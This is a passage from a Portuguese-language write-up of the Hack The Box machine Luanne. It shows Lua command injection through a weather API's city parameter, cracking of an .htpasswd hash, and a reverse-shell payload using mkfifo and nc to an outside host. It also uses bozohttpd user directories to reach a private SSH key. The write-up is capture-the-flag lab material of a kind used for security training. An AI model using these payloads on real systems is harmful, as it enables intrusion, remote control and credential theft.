&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.218/weather/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gosbuter-80-weather.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url: http://10.10.10.218/weather/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads: 50
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes: 200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent: gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout: 10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/19 14:50:37 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/forecast &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 68993 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;31.28%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Em uma chamada utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; faltando parámetros, recebemos um “manual” de como utilizar a API, onde temos a opção de listar o clima pra cidades específicas implementadas.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/weather/forecast
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 200, &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;No city specified. Use 'city=list' to list available cities.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/weather/forecast?city&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;list
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 200,&lt;span class=&quot;s2&quot;&gt;&quot;cities&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;London&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Manchester&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Birmingham&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Leeds&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Glasgow&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Southampton&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Liverpool&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Newcastle&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Nottingham&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Sheffield&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Bristol&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Belfast&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Leicester&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}&lt;/span&gt;
  
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/weather/forecast?city&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;London
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 200,&lt;span class=&quot;s2&quot;&gt;&quot;city&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;London&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;list&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-19&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;snowy&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;12&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;46&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1799&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;92&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2.1975513692014&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;102.76822959445&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-20&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;partially cloudy&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;15&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;43&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1365&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;51&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;4.9522297247313&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;262.63571172766&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-21&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sunny&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;19&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;30&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1243&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;13&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1.8041767538525&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;48.400944394059&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-22&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sunny&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;30&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;34&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1513&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;84&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2.6126398323104&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;191.63755226741&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-23&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;partially cloudy&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;30&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;36&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1772&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;53&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2.7699138359167&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;104.89152945159&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}]}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Embora seja possível consultar as informações nesta API, não consegui identificar nenhum detalhe adicional de como converter essa API de consulta para alguma execução remota de código e decidi seguir para o próximo serviço disponível nesta máquina.&lt;/p&gt;

&lt;h3 id=&quot;9001tcp---serviço-http&quot;&gt;9001/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Buscando por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Medusa httpd 1.12 (Supervisor process manager)&lt;/code&gt; encontrei que o serviço provavelmente se trata da aplicação &lt;a href=&quot;https://github.com/Supervisor/supervisor&quot;&gt;&lt;strong&gt;Supervisor&lt;/strong&gt;&lt;/a&gt;. Buscando pelas credenciais padrão na página do projeto encontrei &lt;strong&gt;user:123&lt;/strong&gt;, as quais permitiram o acesso no portal e exibiu a página abaixo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2fSp0Lx.png&quot; alt=&quot;HTB Luanne - Supervisor&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Com isso podemos observar que a versão do supervisor em execução é  a &lt;strong&gt;4.2.0&lt;/strong&gt;, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.&lt;/p&gt;

&lt;p&gt;Clicando em cada um dos recursos disponíveis, um item interessante chamou atenção: o link &lt;strong&gt;processes&lt;/strong&gt;. Ao acessar as informações ali disponíveis um processo em execução na máquina chamou atenção, frente ao que identificamos no item anterior:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pelo que pudemos identificar a API que estivemos consultando a pouco publicada na porta 80/TCP se trata de um aplicativo desenvolvido em &lt;a href=&quot;https://www.lua.org/start.html&quot;&gt;LUA&lt;/a&gt;, uma linguagem de programação desenvolvida pela Universidade PUC-RJ.&lt;/p&gt;

&lt;h2 id=&quot;acesso-inicial&quot;&gt;Acesso inicial&lt;/h2&gt;

&lt;p&gt;Uma vez que sabemos que a API é desenvolvida em LUA, após algumas pesquisas, encontrei &lt;a href=&quot;https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities&quot;&gt;este artigo&lt;/a&gt; que descreve algumas formas de explorar aplicações escritas em LUA a partir de code injection e, após alguns testes, consegui algo que poderia nos levar a um acesso inicial nesta máquina.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Note&lt;/strong&gt;: O segredo está na codificação do conteúdo passado nos requests, logo, a forma mais simples encontrada foi utilizar o próprio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; com alguns parâmetros conforme listado abaixo, simplificando o processo de &lt;em&gt;escaping&lt;/em&gt; dos caracteres utilizados no payload.:&lt;/p&gt;

&lt;p&gt;A injeção final, que permitiu execução remota de código na máquina foi o resultado abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;city=London') os.execute('ls -la') x=('&quot;&lt;/span&gt; http://10.10.10.218/weather/forecast
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 500,&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;unknown city: Londontotal 20
drwxr-xr-x 2 root wheel 512 Nov 25 11:27 .
drwxr-xr-x 24 root wheel 512 Nov 24 09:55 ..
-rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd
-rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html
-rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A partir desta execução consegui ler o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt;, que possui o hash da senha para acesso ao website que, utilizando o &lt;strong&gt;john&lt;/strong&gt;, consegui crackeá-la a usando o dicionário &lt;strong&gt;rockyou.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .htpasswd
webapi_user:&lt;span class=&quot;nv&quot;&gt;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&lt;/span&gt;
  
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;md5crypt-long .htpasswd
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;md5crypt-long, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and variants&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD5 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 2 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
iamthebest &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;webapi_user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-02-19 17:09&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 3.571g/s 10628p/s 10628c/s 10628C/s sexy..14789632
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para obter um shell reverso, executei a seguinte chamada HTTP:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
curl &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1234 &amp;gt;/tmp/f') x=('&quot;&lt;/span&gt; http://10.10.10.218/weather/forecast

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Ao executar o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; observado que o usuário &lt;strong&gt;r.michaels&lt;/strong&gt; possui em execução a mesma web API LUA utilizada no acesso inicial. A ideia seria obter um shell reverso com a conta do usuário em questão da mesma forma que o acesso inicial foi obtido, porém a exploração utilizada anteriormente não funcionou conforme esperado. Isso nos leva a crer que esta versão da API foi corrigida, conforme podemos notar também o path &lt;strong&gt;devel&lt;/strong&gt; no caminho do arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;weather.lua&lt;/code&gt; em execução na chamada.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels
-b /home/r.michaels/devel/www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;bozohttpd&quot;&gt;bozohttpd&lt;/h3&gt;

&lt;p&gt;Um ponto que estava passando desapercebido até então é que embora acessássemos a aplicação na porta 80/TCP, ela estava publicada na porta 3000/TCP local. Isso implica que algum proxy estava sendo utilizado para a sua publicação. Esta informação foi confirmada ao validar o cabeçalho da resposta recebida em um request diretamente por dentro da máquina:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://127.0.0.1:3000
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
0 199 0 0 0 0 0 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 0
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;
Content-Type: text/html
Content-Length: 199
Server: bozohttpd/20190228
Allow: GET, HEAD, POST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pesquisando sobre o bozohttpd, o servidor utilizado para esta publicação, encontrei esta &lt;a href=&quot;https://man.netbsd.org/NetBSD-7.0/bozohttpd.8&quot;&gt;&lt;strong&gt;man page&lt;/strong&gt;&lt;/a&gt; que descreve uma das suas features: &lt;em&gt;~user translation&lt;/em&gt;, que permite acessar diretórios virtuais dos usuários através de chamada do tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://&amp;lt;server&amp;gt;/~&amp;lt;username&amp;gt;&lt;/code&gt;. Iss foi confirmado a partir da seguinte chaada utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:3000/~r.michaels &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; webapi_user
Enter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'webapi_user'&lt;/span&gt;:iamthebest
  
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 172 0 172 0 0 86000 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 86000
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Document Moved&amp;lt;/h1&amp;gt;
This document had moved &amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:3000/~r.michaels/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;here&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entretanto, uma vez que a instância na porta 3000 roda com a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_httpd&lt;/code&gt;, não temos permissão neste diretório, mas como notamos que existe uma outra instancia na porta 3001 em execução pelo usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt;, pudemos obter o seguinte resultado, onde vemos a existência de um aquivo chamado &lt;strong&gt;id_rsa&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; webapi_user
Enter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'webapi_user'&lt;/span&gt;:iamthebest

